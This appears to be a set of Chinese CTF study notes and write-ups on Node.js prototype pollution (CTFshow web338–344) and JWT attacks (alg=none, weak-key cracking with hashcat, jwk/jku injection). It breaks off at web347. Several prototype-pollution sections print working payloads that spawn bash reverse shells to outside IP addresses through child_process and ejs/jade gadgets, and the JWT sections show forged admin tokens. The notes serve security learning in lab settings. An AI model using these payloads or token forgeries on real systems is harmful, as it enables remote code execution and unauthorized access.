这里只需要满足中括号里面是非数字就行，关于它们的值相不相同，长度一不一样都不重要

1. ?a[]=x&b[]=x

数组传过去，req.query.a到底得到的是什么。如果这样：a[]=1&b[]=2：
![image-20231115122622198](assets/image-20231115122622198.png)
得到的正好就是数组。这时候就相当于需要['1']+flag===['2']+flag。是不成立的

2. ?a[]=x&b=x

[‘a’]+flag= = =‘a’+flag，比如flag是flag{123}，那么最后得到的都是aflag[123}，因此这个也肯定成立：md5([‘a’]+flag)= = =md5(‘a’+flag)，同时也满足a!==b

所以：像[‘a’]+flag= = =‘a’+flag这样的，比如flag是flag{345}，那么最后得到的都是aflag[345}，因此这个也肯定成立：md5([‘a’]+flag)= = =md5(‘a’+flag)，同时也满足a!==b：

?a[0]=1&b[0]=1

?a[0]=1&b[0]=2 不行

但是如果传a[0]=1&b[0]=2，相当于创了个变量a=[1] b=[2]，再像上面那样打印的时候，会打印出1flag{xxx}和2flag{xxx}，md5不相等

## CTFshow NodeJs web338（原型链污染）

这题是原型链污染，参考资料在edge收藏夹里面。

```js
prototype和__proto__分别是什么？

function Foo() {
    this.bar = 1
}

Foo.prototype.show = function show() {
    console.log(this.bar)
}

let foo = new Foo()
foo.show()
```



```js
（实例对象）foo.__proto__ == （类）Foo.prototype

prototype是一个类的属性，所有类对象在实例化的时候将会拥有prototype中的属性和方法
一个对象的__proto__属性，指向这个对象所在的类的prototype属性
```

### **JavaScript原型链继承**

所有类对象在实例化的时候将会拥有prototype中的属性和方法，这个特性被用来实现JavaScript中的继承机制。

```js
function Father() {
    this.first_name = 'Donald'
    this.last_name = 'Trump'
}
function Son() {
    this.first_name = 'Melania'
}
Son.prototype = new Father()          //继承
let son = new Son()
console.log(`Name: ${son.first_name} ${son.last_name}`)

Son类继承了Father类的last_name属性，最后输出的是Name: Melania Trump。
```



**总结一下，对于对象son，在调用son.last_name的时候，实际上JavaScript引擎会进行如下操作：【很重要】**

```js
在对象son中寻找last_name
如果找不到，则在son.__proto__中寻找last_name
如果仍然找不到，则继续在son.__proto__.__proto__中寻找last_name
依次寻找，直到找到null结束。比如，Object.prototype的__proto__就是null
```

![image-20231115123228612](assets/image-20231115123228612.png)

JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。

以上就是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：

**1.每个构造函数(constructor)都有一个原型对象(prototype)**

**2.对象的proto属性，指向类的原型对象prototype**

**3.JavaScript使用prototype链实现继承机制**



### **原型链污染是什么**

前面说到，foo.__proto__指向的是Foo类的prototype。那么，如果我们修改了foo.__proto__中的值，是不是就可以修改Foo类呢？

做个简单的实验：

```js
// foo是一个简单的JavaScript对象
let foo = {bar: 1}

// foo.bar 此时为1
console.log(foo.bar)

// 修改foo的原型（即Object）
foo.__proto__.bar = 2

// 由于查找顺序的原因，foo.bar仍然是1（在对象foo中寻找bar，能找到）
console.log(foo.bar)

// 此时再用Object创建一个空的zoo对象
let zoo = {}

// 查看zoo.bar，返回2。（在对象zoo中寻找bar，找不到，则在zoo.__proto__即Object里面找，能找到）
console.log(zoo.bar)
```

最后，虽然zoo是一个空对象{}，但zoo.bar的结果居然是2：

![image-20231115123548266](assets/image-20231115123548266.png)

原因也显而易见：因为前面我们修改了foo的原型foo.__proto__.bar = 2，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。

后来，我们又用Object类创建了一个zoo对象let zoo = {}，zoo对象自然也有一个bar属性了。

那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。



### **哪些情况下原型链会被污染？**

在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？

我们思考一下，哪些情况下我们可以设置__proto__的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：

```js
对象merge
对象clone（其实内核就是将待操作的对象merge到一个空对象中）
```

以对象merge为例，我们想象一个简单的merge函数：

```js
//函数接受两个参数：`target` 表示目标对象，`source` 表示源对象。
function merge(target, source) {
    for (let key in source) {
        //对于每个属性 `key`，首先检查该属性是否同时存在于源对象和目标对象中。
        if (key in source && key in target) {
            //如果该属性同时存在于源对象和目标对象中，表示需要进一步合并它们的值。这里通过递归调用 `merge` 函数来实现，传入对应的目标属性和源属性作为参数。
            merge(target[key], source[key])
        } else {
            //若该属性只存在于源对象中，或者只存在于目标对象中，直接将源对象的属性值赋给目标对象的对应属性。
            target[key] = source[key]
        }
    }
}

//通过这个 `merge` 函数，可以将源对象中的属性合并到目标对象中，如果属性名称在目标对象中已存在，则进行深度合并。这对于合并两个对象的属性非常有用，特别是在处理嵌套对象的情况下。
```

在合并的过程中，存在赋值的操作target[key] = source[key]，那么，这个key如果是__proto__，是不是就可以原型链污染呢？

我们用如下代码实验一下：

```js
let o1 = {}
let o2 = {a: 1, "__proto__": {b: 2}}
merge(o1, o2)
console.log(o1.a, o1.b)

o3 = {}
console.log(o3.b)
```

结果是，合并虽然成功了，但原型链没有被污染：

![image-20231115123710333](assets/image-20231115123710333.png)

这是因为，我们用JavaScript创建o2的过程（let o2 = {a: 1, "__proto__": {b: 2}}）中，__proto__已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是[a, b]，__proto__并不是一个key，自然也不会修改Object的原型。

那么，如何让__proto__被认为是一个键名呢？

我们将代码改成如下：

```js
let o1 = {}
let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
merge(o1, o2)
console.log(o1.a, o1.b)

o3 = {}
console.log(o3.b)
```

可见，新建的o3对象，也存在b属性，说明Object已经被污染：

![image-20231115123736766](assets/image-20231115123736766.png)

这是因为，JSON解析的情况下，__proto__会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。

merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。

### 看看题目

和334一样的界面。

核心源码

```js
common.js

module.exports = {
  copy:copy
};

function copy(object1, object2){
    for (let key in object2) {
        if (key in object2 && key in object1) {
            copy(object1[key], object2[key])
        } else {
            object1[key] = object2[key]
        }
    }
}
```

login.js

```js
var express = require('express');
var router = express.Router();
var utils = require('../utils/common');        //导入common文件模块
/* GET home page.  */
router.post('/', require('body-parser').json(),function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var secert = {};
  var sess = req.session;
  let user = {};
  utils.copy(user,req.body);
  if(secert.ctfshow==='36dboy'){
    res.end(flag);
  }else{
    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  
  }


});

module.exports = router;
```

这里的copy()很像merge()，一眼原型链污染。

思路：

可以看到，如果secert.ctfshow==='36dboy'那我就能得到flag。secert类为空，直接继承了Object类，user也是。所以secert类中没有ctfshow，我们可以通过user污染Object类，在Object类里面加一个ctfshow。判断secert.ctfshow==='36dboy'时，找不到ctfshow，就会从Object里面找。

参考上面P神给的payload：{"a": 1, "__proto__": {"b": 2}}

我们根据此题把payload修改为{"a": 1, "__proto__": {"ctfshow": "36dboy"}}

抓个包先，直接登录框输入不行

![image-20231115124105791](assets/image-20231115124105791.png)

把参数修改为我的payload，得到flag。

## CTFshow NodeJs web339(原型链污染反弹shell)

源码直接给了

app.js

```js
。。。。
```

common.js

```js
module.exports = {
  copy:copy
};
//类似于merge函数，存在原型链污染漏洞
function copy(object1, object2){
    for (let key in object2) {
        if (key in object2 && key in object1) {
            copy(object1[key], object2[key])
        } else {
            object1[key] = object2[key]
        }
    }
  }
```

api.js（关键代码）

```js
//使用 Express 框架的路由文件

//在这部分代码中，首先引入了 express 模块，然后创建了一个路由对象 router。
var express = require('express');
var router = express.Router();
//引入了一个名为 utils（var utils） 的自定义工具模块。
var utils = require('../utils/common');



/* GET home page.  */
//通过 router.post() 方法定义了一个 POST 请求的处理函数，路径为 '/'。
router.post('/', require('body-parser').json(),function(req, res, next) {
  //通过 res.type('html') 设置响应的内容类型为 HTML。
  res.type('html');
  //然后，通过 res.render() 方法渲染名为 'api' 的视图模板，并传递一个包含 query 属性的对象作为参数。这里使用了 Function(query) 来创建一个函数，并立即调用该函数并传递 query 作为参数。这样做可能是为了在视图模板中使用 query 变量。
  res.render('api', { query: Function(query)(query)});       //函数名query，参数query
});

//通过 module.exports 将 router 对象导出，以便在其他文件中引入和使用。
module.exports = router;
```

index.js

```js
var express = require('express');
var router = express.Router();

/* GET home page. */
router.get('/', function(req, res, next) {
  res.type('html');
  res.render('index', { title: 'Express' });
});

module.exports = router;
```

login.js

```js
var express = require('express');
var router = express.Router();
var utils = require('../utils/common');

function User(){
  this.username='';
  this.password='';
}
function normalUser(){
  this.user
}


/* GET home page.  */
router.post('/', require('body-parser').json(),function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var secert = {};
  var sess = req.session;
  let user = {};
  utils.copy(user,req.body);
  if(secert.ctfshow===flag){
    res.end(flag);
  }else{
    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  
  }


});

module.exports = router;
```

和上一题的区别在于，上一题判断语句是if(secert.ctfshow= = =‘36dboy’)，这题是if(secert.ctfshow= = =flag)，但是变量flag的值我们不知道，所以不能使用上一题的payload污染原型修改secert.ctfshow。

通过 login.js 里的 utils.copy(user,req.body); 污染原型，然后访问 api 的时候由于 query未定义，所以会向其原型找，那么通过污染原型构造恶意代码即可rce。

因为所有变量的最顶层都是object，当前环境没有y4tacker，它会直接去寻找Object对象的属性当中是否有y4tacker这个键值对是否存在

![image-20231115124415639](assets/image-20231115124415639.png)

原型污染以后 login.js 就不能正常运行了，所以payload使用反弹shell。

payload：（抓包改包）

```js
监听9023端口nc -lvvp 9023

{"__proto__":{"query":"return process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/47.115.219.82/8080 0>&1\"')"}}

或者

{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/120.46.41.173/9023 0>&1\"')"}}

先在/login页面POST一下进行变量覆盖，再在/api界面直接POST访问即可
```

非预期：

```js
{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/120.46.41.173/9023 0>&1\"');var __tmp2"}}
//接着post访问api.js就可以反弹shell了
```

我们做题时，如果污染错了，要及时重开环境。 一旦污染了原型链，除非整个程序重启，否则所有的对象都会被污染与影响。这将导致一些正常的业务出现bug。

具体原理请看：

https://yq1ng.github.io/2020/12/31/ctfshow-nodejs-zhuan-ti/#web339

## CTFshow NodeJs web340(原型链污染两层RCE反弹shell)

**子类不能污染父类已经存在的属性，只能新增属性**

源码都给了，这次只放和上题不一样的部分。

login.js

```js
var express = require('express');
var router = express.Router();
var utils = require('../utils/common');



/* GET home page.  */
router.post('/', require('body-parser').json(),function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var user = new function(){
    this.userinfo = new function(){
    this.isVIP = false;
    this.isAdmin = false;
    this.isAuthor = false;     
    };
  }
  utils.copy(user.userinfo,req.body);
  //user.userinfo.isAdmin原本就存在，不会向上找，修改Object.isAdmin无用
  if(user.userinfo.isAdmin){
   res.end(flag);
  }else{
   return res.json({ret_code: 2, ret_msg: '登录失败'});  
  }


});

module.exports = router;1
```

user.userinfo.isAdmin不存在，但是user.isAdmin存在，向上找时，找到user.userinfo的上一级user就获得了isAdmin属性，不会再回溯到user的上一级Object，所以修改Object.isAdmin无用。

所以直接原型链污染属性isAdmin行不通

就算我们污染了，代码中应该是这样的。

```js
if(user.userinfo.isAdmin)语句判断

user.userinfo对象没有isAdmin属性。
user对象有isAdmin属性，值是false。
就不会去上层Object对象寻找isAdmin属性。

因为子类不能污染父类已经存在的属性，只能新增属性。所以不能修改已存在的user.isAdmin，不能满足if语句。
```

上一题从secert对象进行污染，secert对象上一级就是object，所以污染一次就行了。

```js
{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/120.46.41.173/9023 0>&1\"');var __tmp2"}}
```

这一题从userinfo对象进行污染，userinfo对象上一级是user对象，user对象上一级就是object，所以需要污染两次。

payload：

```js
{"__proto__":{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/47.115.219.82/443 0>&1\"')"}}}

上一题的payload放一起对比一下：
{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/120.46.41.173/9023 0>&1\"')"}}

```

记得POST发包调成json格式，之后POST直接访问/api路由，反弹shell,在环境变量env中找到flag

![image-20231115130955655](assets/image-20231115130955655.png)

## CTFshow NodeJs web341(ejs原型链污染)

先下一个叫snyk的工具

进kali，sudo su进入root用户

apt install npm 下载npm

![image-20231115131556019](assets/image-20231115131556019.png)

sudo npm install -g snyk 安装snyk

![image-20231115131605949](assets/image-20231115131605949.png)

snyk auth进行授权，会自动跳转到一个网页，我选的是github授权。

![image-20231115131614384](assets/image-20231115131614384.png)

如果github上不去的话，物理机上面科学上网开个全局就行了，这样虚拟机也能用。

![image-20231115131624374](assets/image-20231115131624374.png)

snyk test 测试一下snyk能不能用了

![image-20231115131636476](assets/image-20231115131636476.png)

snyk --help 查看snyk常用命令，结束！

接下来继续做题。

先把源码下载下来。

cd进源码目录，snyk test使用snyk进行漏洞扫描

![image-20231115131655451](assets/image-20231115131655451.png)

可以发现这题确实存在ejs模板引擎漏洞。

payload直接打了：（记得POST包发json格式）

```js
{"__proto__":{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/47.115.219.82/443 0>&1\"');var __tmp2"}}}
```

随便访问页面就能监听到。

环境变量找到flag

## CTFshow NodeJs web342（jade原型链污染）

初始界面：

payload：（json）

```js
{"__proto__":{"__proto__": {"type":"Code","compileDebug":true,"self":true,"line":"0, \"\" ));return global.process.mainModule.constructor._load('child_process').execSync('bash -c \"bash -i >& /dev/tcp/47.115.219.82/443 0>&1\"');//"}}}

{"__proto__":{"__proto__": {"type":"Block","nodes":"","compileDebug":1,"self":1,"line":"global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/47.115.219.82/443 0>&1\"')"}}}

{"__proto__":{"__proto__": {"type":"Block","nodes":"","compileDebug":1,"self":1,"line":"global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/xxx/810>&1\"')"}}}
```

在login页面打上去之后随便访问下，就会反弹。

还是一样去环境变量里面找。

## CTFshow NodeJs web343（jade原型链污染）

题目描述说342基础上增加了过滤

但是payload还是不变，同342。

## CTFshow NodeJs web344

直接给了源码。

```js
router.get('/', function(req, res, next) {
  res.type('html');
  var flag = 'flag_here';
  if(req.url.match(/8c|2c|\,/ig)){
  	res.end('where is flag :)');
  }
  var query = JSON.parse(req.query.query);
  if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){
  	res.end(flag);
  }else{
  	res.end('where is flag. :)');
  }

});

if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true)进行了判断，满足条件就返回flag。
var query = JSON.parse(req.query.query)表示query对象是由get请求传入的json字符串

所以我们的payload应该是：
?query={"name":"admin","password":"ctfshow","isVIP":true}
```

url 中不能包含大小写 8c、2c 和 逗号

先构造一个正常请求

    /?query={"name":"admin","password":"ctfshow","isVIP":true}

发现题目会过滤掉逗号，尝试 URL 编码， urlencode(",") = %2c 发现 2c 也被过滤

HTTP协议中 允许 同名参数 出现多次，例如?a=1&a=2 ，有的服务端取的1，有的取的2 。不同服务端对同名参数处理都是不一样的，下面链接列举了一些：

```php
Web服务器 　　　　　　 参数获取函数 　　　　　　　　　　   获取到的参数

PHP/Apache　　 　　  $_GET(“par”) 　　　　　　　　　　 Last

JSP/Tomcat 　　　　  Request.getParameter(“par”)    First

Perl(CGI)/Apache 　 Param(“par”) 　　　　　　　　　　 First

Python/Apache 　　  getvalue(“par”) 　　　　　　　　  All(List)

ASP/IIS 　　　　　　 Request.QueryString(“par”) 　　 All (comma-delimited string)
```

nodejs 会把同名参数以数组的形式存储，并且 JSON.parse 可以正常解析。

因此构造

```js
?query={"name":"admin"&query="password":"%63tfshow"&query="isVIP":true}
这里把 ctfshow 的 c 进行url编码，是因为 双引号 的url编码是 %22，和 c 连接起来就是 %22c，会匹配到正则表达式。
```

    ?query={"name":"admin"&query="password":"%63tfshow"&query="isVIP":true}

![image-20231117110218412](assets/image-20231117110218412.png)

# 0x09 jwt

## 前言

**JWT简单的介绍**

JSON Web 令牌 （JWT） 是一种标准化格式，用于在系统之间发送加密签名的 JSON 数据。理论上，它们可以包含任何类型的数据，但最常用于发送有关用户的信息（“声明”），作为身份验证、会话处理和访问控制机制的一部分。

与经典会话令牌不同，服务器所需的所有数据都存储在 JWT 本身的客户端中。这使得 JWT 成为用户需要与多个后端服务器无缝交互的高度分布式网站的热门选择。



**JWT的格式**

JWT 由 3 部分组成：header,  payload,  signature。它们各用一个点分隔（JWT格式：`Header.Payload.Signature`），如以下示例所示：

![img](assets/1683535426233-da5d47d7-11e1-4d8e-979a-5b0019c73dd9.png)

JWT 的标头和有效负载部分只是 base64url 编码的 JSON 对象。标头包含有关令牌本身的元数据，而有效负载包含有关用户的实际“声明”。



JWT解码：https://jwt.io/

![img](assets/1683246765720-a3d9b664-3f01-4521-9e05-1626bfc4eb1a.png)



Header

说明了加密算法，和 Token 类型

```json
{
  "alg":"RSA",		# 加密算法
  "typ":"JWT"			# Token类型
}
```

Payload

可以自定义，含用户数据信息等参数，通过修改参数，有可能进行越权查看其他用户信息。

```bash
{
  "sub": "1234567890",
  "name": "Helen",
  "admin": true
}
```

Signature

```bash
Signature = HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload),"secret")
```

secret 保存在后端，就是来解析确定验证的 key。

## 0x01 JWT流量特征

1、`eyJ`开头，`eyJ`base64解密之后是`{"`。

![img](assets/1683247573280-bbc62abc-2746-469a-bd97-1bbca309a822.png)

2、使用 Burpsuite 插件：`JWT Editor Keys`。

![img](assets/1683247669896-b4542bf2-3e8f-42da-8428-0a3a4567f914.png)



## 0x02 JWT潜在的漏洞

### 1）签名未验证-绕过方式一

-	**漏洞验证	-**

在线靶场：通过未经验证的签名绕过 JWT 身份验证（`JWT authentication bypass via unverified signature`）

signature  后端没有对`header`内的`alg`value 进行校验。

1、

先登录`wiener:peter`账户，在`burp suite`中直接双击JWT可以直接以句号分隔，在右边的inspector选项卡中会自动对它进行解码，不过并不支持一起全部解码，只能一段一段的查看。

这里可以明显看到解码后的结果有一个wiener的用户名。

![img](assets/1683436915205-88bd2f65-c1c4-4059-9c3a-10e379fc030a.png)

随后我们使用`wiener`用户访问`/admin`路径，响应包显示没有权限访问。

![img](assets/1683437084144-ad5b93c6-e9cf-428e-9e29-e6dec04e32f3.png)

直接在在右边的 **inspector** 选项卡中对`"sub":""`参数进行用户名修改，改为`"sub":"administrator"`，再次访问`/admin`路径，发现访问成功。签名未对用户名进行校验。

![img](assets/1683437276105-3a424111-9ce6-4161-aec5-10143d82a878.png)

在响应中，找到用于删除 `Carlos` ( `/admin/delete?username=carlos`) 的 URL。

![img](assets/1683438085722-fd2f4067-20aa-4e2a-a44d-f56cfe96579e.png)

删除用户成功后，响应包显示 302 跳转。

![img](assets/1683438172088-2465d60a-8d72-4bb7-b347-24e93fcc02e8.png)

再次查看 `/admin` 响应包，发现`Carlos`用户信息已经被删除。

![img](assets/1683438321090-6d755cb3-b8ab-4d11-8289-29427796cd4c.png)

------

### 2）签名未验证-绕过方式二

在Header中，设置alg的值可以选择签名方式，就像前面的介绍，可以选择HS256，即HMAC和SHA256。在某些情况下可以设置为None，即不签名，但是一般都会过滤这种危险的设置，实战中较少，可以尝试大小写等等绕过。

在线靶场：

1、将改为`"alg":"none"`。

![img](assets/1683439061578-b636a446-6623-4e9a-8538-0e80b4a9d1ce.png)

2、将改为`"sub":"administrator"`。

![img](assets/1683440173129-d2eec972-fc84-46b1-8a17-4ad8d9d72f10.png)

3、删除 JWT 的 signature 字段。

![img](assets/1683440264105-d3bcc89a-5086-40a3-9c2c-e531ea358455.png)

虽后再访问`/admin`路径就正常了。

![img](assets/1683440328675-a9b1bf05-4a51-4377-bad8-c6838972f534.png)

------

### 3）弱密钥可被暴力破解

```
JWT authentication bypass via weak signing key
```

一些签名算法，例如 HS256 (HMAC + SHA-256)，使用任意的独立字符串作为密钥。就像密码一样，重要的是这个秘密不能轻易被攻击者猜到或暴力破解。否则，他们可能能够使用他们喜欢的任何标头和有效负载值创建 JWT，然后使用密钥重新签署具有有效签名的令牌。



在实施 JWT 应用程序时，开发人员有时会犯错误，例如忘记更改默认或占位符机密。他们甚至可能复制并粘贴他们在网上找到的代码片段，然后忘记更改作为示例提供的硬编码秘密。在这种情况下，攻击者使用众所周知的秘密单词列表来暴力破解服务器的秘密可能是微不足道的。



**漏洞检测**

使这里使用的是hashcat，进行破解（Kali上自带这款工具），使用语句如下：

`jwt.secrets.list`密钥列表地址：https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list

```bash
hashcat -a 0 -m 16500 <jwt> <wordlist>

// 示例：hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list

// 这是对 Hashcat 命令的参数解释：

- `-a 0`: 这个参数指定了攻击模式。`0` 表示字典攻击模式，也就是使用一个密码字典来尝试破解。在这种模式下，Hashcat 会将字典中的每个单词都与哈希值进行比较，直到找到匹配的密码为止。
- `-m 16500`: 这个参数指定了要破解的哈希类型。`16500` 表示 Json Web Token (JWT) 的哈希类型。Hashcat 需要知道要破解的哈希类型才能正确地对其进行处理。
- `<jwt>`: 这个参数指定了要破解的 JWT 哈希值。Hashcat 将使用所选的攻击模式和密码字典来尝试破解该哈希值。
- `<wordlist>`: 这个参数指定了要用于字典攻击的单词列表文件路径。Hashcat 将使用该列表中包含的单词来尝试破解 JWT 哈希值。
```

![img](assets/1683462666283-c016a56c-1af4-46e3-8c06-6b426fef4d19.png)

![img](assets/1683462695247-6244f132-de03-49b1-a3ae-c4260c816e8d.png)

爆破成功，得到弱密钥：`secret1`。并在 https://jwt.io/ 对原来的密钥进行编码处理

![img](assets/1683464202178-f300e241-4718-4528-ba44-dfca34e93e70.png)

成功访问到 `/admin` 路径下的页面。

![img](assets/1683464012471-d5b72d4b-4ef5-4023-813f-aa5ecb2c3719.png)

------

### 4）通过 jwk 参数注入自签名 JWT

```
JWT authentication bypass via jwk header injection
```

首先在插件`JWT Editor key`中产生`NEW RSA Key`，选择RSA选项，点击生成即可

![img](assets/1683470149383-eaec63ed-0fb0-40df-95ea-bf7ee21d4516.png)

在repeater中改到JWT编辑界面，选择下面的嵌入JWK 进行攻击。

![img](assets/1683470268794-a392326f-3990-4b3f-95ee-15d73da3f948.png)

在弹窗中选择你产生的RSA密钥对

![img](assets/1683470288981-bbeb60e3-956e-4ae8-9edd-fdb7dfe3a4a7.png)

![img](assets/1683470645609-d9b3dfbd-a98b-4f06-b542-c7d697891acc.png)

成功访问管理员页面。

![img](assets/1683470944815-6bcf1701-d0e3-405a-b36e-1d7760579e79.png)

------

### 5）通过 jku 参数注入自签名 JWT

```
JWT authentication bypass via jku header injection
```



1、首先我们使用`wiener`用户是没有权限访问`/admin`路径的。

![img](assets/1683537883964-e15e6332-006c-42e2-85f2-a0452810ac17.png)

2、回到浏览器，点击`Go to exploit server`跳转至EXP生成页面，生成EXP。

![img](assets/1683537967457-c39a33dc-5064-4118-a983-03729db77dd4.png)

3、将`Body`内的信息替换为如下内容：

```bash
{
    "keys": [

    ]
}
```

![img](assets/1683538248945-49712fb8-89fe-4240-b0e7-3e07a6feb642.png)

4、再回到Brupsuite 的`JWT editor Keys`，点击`**New RSA Key** `生成一个新的key，然后右键复制`**Copy Public Key as JWK**`将复制到的Keys粘贴到刚才的`Body`内，并点击Store保存，如下所示：

![img](assets/1683538655170-8b1dd8b1-e612-499d-b35b-c414df40aa99.png)

![img](assets/1683538826906-5b214a7d-a622-406b-9882-a6008e6cf4f5.png)

5、随后复制顶部出现的URL地址，后边会用到。![img](assets/1683538877669-6e540778-711b-47d8-be95-10ff736e8395.png)

6、回到Repeter，点击`JSON Web Token`编辑面板，在`Header`面板内编辑。

![img](assets/1683539496835-9815fd51-fa56-4ae5-bd77-b968f5167d7c.png)

![img](assets/1683539710334-27f8b45c-9be8-460c-82ed-6e27a76663b6.png)

7、点击底部的`Sign`，选择刚才生成的RSA生成签名。

![img](assets/1683539742752-05c18b34-90a5-4b10-bfda-f37fdcc5affc.png)

8、成功访问到`/admin`路径。

![img](assets/1683537304487-cc5fd9e5-ec9c-4f87-af23-521855790838.png)

------

### 6）通过 kid 注入 JWT，与目录遍历攻击相结合

```
JWT authentication bypass via kid header path traversal
```

😂偷懒了，，没有写，可以参考底部的链接，或者官网给出的解题步骤进行实验。最重要的是要理解原理。

### web345

启动靶机，进入环境。一个熟悉的where is flag?

F12查看元素发现/admin的提示，说明需要伪造身份。

先学习jwt的知识

> JWT的优缺点
> 基于session和基于jwt的方式的主要区别就是用户的状态保存的位置，session是保存在服务端的，而jwt是保存在客户端的。自身包含了认证鉴权所需要的所有信息，服务器端无需对其存储，从而给服务器减少了存储开销。
>
> 1可扩展性好，
>
> 2无状态jwt不在服务端存储任何状态
>
> JWT长什么样？
> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ
>
> 看着与BASE64加密很像，但其中的+，/分别会被替换为减号（-）和下划线（_）
>
> “=”等号是被去掉的
>
> JWT的过程
> 1服务端根据用户登录信息，将信息生成token，返给客户端
>
> 2客户端收到服务端返回的token，存储在cookie中
>
> 3客户端携带token信息发送到服务端 ,以放在http请求头信息中，如：Authorization字段里面
>
> 4服务端检验token的合法性，如何合法，则成功，完成相应的响应
>
> jwt的结构
> jwt由三部分组成，每部分之间用.分隔，分别为
> 1、Header
> 2、Payload
> 3、Signature
>
> Header
> header示例如下：
> {
> “alg”: “HS256”,
> “typ”: “JWT”
> }
>
> header由两部分组成，typ代表令牌的类型，也就是jwt，alg代表签名算法，常用的有hs256和rs256，分别代表HMAC和RSA
>
> Payload
> iss: jwt签发者
> sub: jwt所面向的用户
> aud: 接收jwt的一方
> exp: jwt的过期时间，这个过期时间必须要大于签发时间
> nbf: 定义在什么时间之前，该jwt都是不可用的.
> iat: jwt的签发时间
> jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。
> {
>
> "sub": "1234567890",
>
> "name": "John Doe",
>
> "iat": 1516239022
>
> }
>
> Signature
> 要创建签名部分，必须获取已编码的标头（header）、编码的有效负载（payload）、密钥、header中指定的算法，并对其进行签名。
>
> 签名用于验证信息在传输过程中是否被篡改，并且在使用私钥签名令牌的情况下，它还可以验证 JWT 的发送者是否正确。
>
> 由三部分组成
>
> header
>
> payload
>
> secret
>
> 这个部分需要base64url后的header和base64url后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密，然后就构成了jwt的第三部分。
>
> var encodedString = base64UrlEncode(header) + '.' + base64UrlEncode(payload);
>
> var signature = HMACSHA256(encodedString, 'secret');
>
> 注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端是可以自我签发jwt了。

直接bp抓包，找到Token 放在jwt.io上面改，注意是/admin/

![](assets/%E6%8A%93%E5%8F%96Cookie.png)

获得了以下信息：

```
{
  "alg": "None",
  "typ": "jwt"
}
```

alg为None算法，无签名认证

下面构造payload：

```
[
  {
    "iss": "admin",
    "iat": 1696317561,
    "exp": 1696324761,
    "nbf": 1696317561,
    "sub": "user",
    "jti": "54faa4bd3108499bee219367c90bc09d"
  }
]
```

开始转换

```
eyJhbGciOiJIUzI1NiIsInR5cCI6Imp3dCJ9.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2OTYzMTc1NjEsImV4cCI6MTY5NjMyNDc2MSwibmJmIjoxNjk2MzE3NTYxLCJzdWIiOiJhZG1pbiIsImp0aSI6IjU0ZmFhNGJkMzEwODQ5OWJlZTIxOTM2N2M5MGJjMDlkIn1d.
```

由于无签名认证，只取前面的部分。

获得flag。

![](assets/flag.png)



### web346

启动靶机，进入环境。一个熟悉的where is flag?

然后又是/admin，抓包

得到了Cookie:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY5NjMyMDE5NiwiZXhwIjoxNjk2MzI3Mzk2LCJuYmYiOjE2OTYzMjAxOTYsInN1YiI6InVzZXIiLCJqdGkiOiI1ZmMwYWQwMWFkZTgzNDBmNGM2ODRiMzkyMDk5NjZhOCJ9.K4uexoNrg9Yw6bxg2e3GcoJTXvwXYC5HLQat0PjGzdw
```

![](assets/Cookie%E6%A3%80%E6%9F%A5.png)

HS256&Invalid Signature

使用None算法绕过签名，将alg更改为None。(注意大小写)

构造payload：(此处必须使用脚本)

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTcwMDAxMzc0MywiZXhwIjoxNzAwMDIwOTQzLCJuYmYiOjE3MDAwMTM3NDMsInN1YiI6ImFkbWluIiwianRpIjoiOWI5MjI5ZDA0NzlmZGM5NDRmOThmZWFmMDcwYjgxNTEifQ.
```

重放，得到flag

### web347

启动靶机，进入环境。一个熟悉的where is flag?

然后又是/admin，抓包

Cookie:

```
